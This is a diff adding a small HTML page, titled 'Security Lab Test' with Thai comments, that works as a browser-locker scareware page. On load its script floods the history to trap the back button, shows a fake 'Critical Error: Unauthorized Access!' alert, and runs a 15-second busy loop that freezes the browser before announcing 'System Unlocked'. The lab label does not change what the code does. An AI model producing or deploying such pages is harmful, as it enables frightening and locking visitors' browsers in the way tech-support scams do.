@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Lab Test</title>
+    <style>
+        body { background-color: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; margin: 0; }
+        .warning-box { border: 2px solid #f00; padding: 20px; text-align: center; background: rgba(255,0,0,0.1); }
+        .glitch { font-size: 24px; font-weight: bold; animation: blink 0.5s infinite; color: #ff0000; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="warning-box">
+        <div class="glitch">⚠️ SYSTEM OVERLOAD ⚠️</div>
+        <p>Testing Resource Management...</p>
+    </div>
+
+    <script>
+        window.onload = function() {
+            // 1. ล็อคปุ่มย้อนกลับ (ทำให้กดยากขึ้น)
+            for(let i=0; i<15; i++) {
+                history.pushState(null, null, window.location.href);
+            }
+
+            // 2. แสดงแจ้งเตือนรัวๆ
+            setTimeout(() => {
+                alert("Critical Error: Unauthorized Access!");
+                
+                // 3. เริ่ม Stress Test (ทำให้เครื่องค้างประมาณ 12-15 วินาที)
+                const targetTime = Date.now() + 15000; 
+                while (Date.now() < targetTime) {
+                    // วนลูปหนักๆ ให้ CPU ทำงานเต็มที่
+                    const x = Math.pow(Math.random(), Math.random());
+                }
+
+                alert("Test Completed. System Unlocked.");
+            }, 500);
+        };
+    </script>
+</body>
+</html>
